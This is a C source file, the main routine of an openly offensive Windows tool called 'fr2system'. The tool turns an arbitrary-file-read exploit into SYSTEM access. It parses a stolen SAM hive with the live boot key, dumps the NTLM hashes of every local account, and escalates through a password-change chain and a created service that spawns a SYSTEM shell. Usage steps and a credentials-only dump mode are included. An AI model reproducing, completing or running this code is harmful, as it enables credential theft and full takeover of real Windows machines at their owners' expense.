// fr2system - Arbitrary File Read to SYSTEM
//
// Reusable post-exploitation toolkit:
// 1. Reads SAM hive from C:\Windows\Temp\fileread\SAM
// 2. Extracts boot key from live registry (std user)
// 3. Decrypts all NTLM hashes offline
// 4. Escalates to SYSTEM via SamiChangePasswordUser chain
//
// Usage:
//   Step 1: Run your arb file read PoC, save SAM to C:\Windows\Temp\fileread\SAM
//   Step 2: Run fr2system.exe
//   Step 3: SYSTEM shell appears
//
// Flags:
//   --dump       Only dump credentials, don't escalate
//   --service N  Internal: run as SYSTEM service in session N
//   --path DIR   Custom input directory (default: C:\Windows\Temp\fileread)

#include "common.h"
#include "bootkey.h"
#include "samparse.h"
#include "escalate.h"
#include "altrouttes.h"

static void PrintBanner() {
    printf("\n");
    printf("  ___________  ___                _               \n");
    printf("  |  ___| ___ \\|__ \\              | |              \n");
    printf("  | |_  | |_/ /  ) |___ _   _ ___| |_ ___ _ __ ___\n");
    printf("  |  _| |    /  / // __| | | / __| __/ _ \\ '_ ` _ \\\n");
    printf("  | |   | |\\ \\ / /\\__ \\ |_| \\__ \\ ||  __/ | | | | |\n");
    printf("  \\_|   \\_| \\_|____/___/\\__, |___/\\__\\___|_| |_| |_|\n");
    printf("                        __/ |                      \n");
    printf("                       |___/                       \n");
    printf("  File Read to SYSTEM - Post-Exploitation Toolkit\n");
    printf("  ================================================\n\n");
}

static void PrintUsage() {
    printf("Usage:\n");
    printf("  fr2system.exe                  Escalate to SYSTEM (reads from default path)\n");
    printf("  fr2system.exe --dump           Dump credentials only, no escalation\n");
    printf("  fr2system.exe --scan           Scan for alternative credential sources\n");
    printf("  fr2system.exe --path C:\\dir    Use custom input directory\n");
    printf("\nExpected files in input directory:\n");
    printf("  SAM       (required) - SAM registry hive\n");
    printf("  SECURITY  (optional) - SECURITY registry hive (for LSA secrets)\n");
    printf("\nDefault input: %ws\n", FR2S_INPUT_DIR);
}

int wmain(int argc, wchar_t* argv[]) {

    // ── Service mode: we're running as SYSTEM, launch shell ──
    if (argc >= 3 && _wcsicmp(argv[1], L"--service") == 0) {
        if (FR2S_IsSystem()) {
            DWORD sessionId = _wtoi(argv[2]);
            FR2S_Ok("Running as SYSTEM in service context");
            FR2S_LaunchSystemShell(sessionId);
        }
        return 0;
    }

    // ── Create-service mode: running as admin user, create + start SYSTEM service ──
    if (argc >= 3 && _wcsicmp(argv[1], L"--create-service") == 0) {
        DWORD sessionId = _wtoi(argv[2]);
        return FR2S_CreateServiceHelper(sessionId);
    }

    PrintBanner();

    // ── Parse arguments ──
    BOOL dumpOnly = FALSE;
    BOOL scanMode = FALSE;
    wchar_t inputDir[MAX_PATH];
    wcscpy_s(inputDir, FR2S_INPUT_DIR);

    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"--dump") == 0) {
            dumpOnly = TRUE;
        }
        else if (_wcsicmp(argv[i], L"--scan") == 0) {
            scanMode = TRUE;
        }
        else if (_wcsicmp(argv[i], L"--path") == 0 && i + 1 < argc) {
            wcscpy_s(inputDir, argv[++i]);
        }
        else if (_wcsicmp(argv[i], L"--help") == 0 || _wcsicmp(argv[i], L"-h") == 0) {
            PrintUsage();
            return 0;
        }
    }

    // ── Scan mode ──
    if (scanMode) {
        FR2S_ScanAlternativeRoutes();
        return 0;
    }

    // ── Build file paths ──
    wchar_t samPath[MAX_PATH], secPath[MAX_PATH];
    wsprintfW(samPath, L"%s\\SAM", inputDir);
    wsprintfW(secPath, L"%s\\SECURITY", inputDir);

    // ── Check SAM file exists ──
    DWORD attr = GetFileAttributesW(samPath);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        FR2S_Err("SAM file not found at: %ws", samPath);
        FR2S_Err("Run your arb file read PoC first to place the SAM hive there.");
        printf("\n");
        PrintUsage();
        return 1;
    }
    FR2S_Ok("SAM file found: %ws", samPath);

    // Check for SECURITY hive (optional)
    BOOL hasSecurityHive = GetFileAttributesW(secPath) != INVALID_FILE_ATTRIBUTES;
    if (hasSecurityHive) {
        FR2S_Ok("SECURITY file found: %ws (LSA secrets available)", secPath);
    }

    // ── Step 1: Extract boot key ──
    FR2S_Log("Extracting boot key from live registry...");
    BYTE bootKey[16] = { 0 };
    if (!FR2S_GetBootKey(bootKey)) {
        FR2S_Err("Failed to extract boot key. Are you running on the same machine?");
        return 1;
    }
    FR2S_Ok("Boot key: ");
    printf("     ");
    FR2S_HexDump(bootKey, 16);
    printf("\n");

    // ── Step 2: Parse SAM → NTLM hashes ──
    FR2S_Log("Parsing SAM hive...");
    FR2S_CREDENTIAL creds[FR2S_MAX_USERS] = { 0 };
    int credCount = FR2S_ParseSAM(samPath, bootKey, creds, FR2S_MAX_USERS);

    if (credCount == 0) {
        FR2S_Err("No credentials extracted from SAM");
        return 1;
    }
    FR2S_Ok("Extracted %d credential(s):\n", credCount);

    // ── Print credentials ──
    printf("  %-24s %-6s %-34s\n", "USERNAME", "RID", "NTLM HASH");
    printf("  %-24s %-6s %-34s\n", "------------------------", "------", "----------------------------------");
    for (int i = 0; i < credCount; i++) {
        printf("  %-24ws %-6d ", creds[i].username, creds[i].rid);
        if (creds[i].ntlmHashLen > 0) {
            FR2S_HexDump(creds[i].ntlmHash, 16);
        }
        else {
            printf("{empty}");
        }
        if (creds[i].isCurrentUser) printf("  (current)");
        printf("\n");
    }
    printf("\n");

    if (dumpOnly) {
        FR2S_Ok("Dump mode - skipping escalation.");
        return 0;
    }

    // ── Step 3: Escalate to SYSTEM ──
    FR2S_Log("Starting escalation chain...");
    printf("  [!] This will temporarily change user passwords and restore them.\n");
    printf("  [!] If the process crashes, passwords may need manual reset.\n\n");

    BOOL success = FR2S_Escalate(creds, credCount, dumpOnly);

    if (success) {
        printf("\n");
        FR2S_Ok("=== SYSTEM SHELL LAUNCHED ===");
        FR2S_Ok("Check for a new cmd.exe window running as NT AUTHORITY\\SYSTEM");
        printf("\n");
    }
    else {
        printf("\n");
        FR2S_Err("Escalation failed. Possible reasons:");
        FR2S_Err("  - No admin users found with non-empty NTLM hashes");
        FR2S_Err("  - SAM hive may be from a different machine than boot key");
        FR2S_Err("  - Account lockout policy may be blocking logon attempts");
        printf("\n");
    }

    return success ? 0 : 1;
}
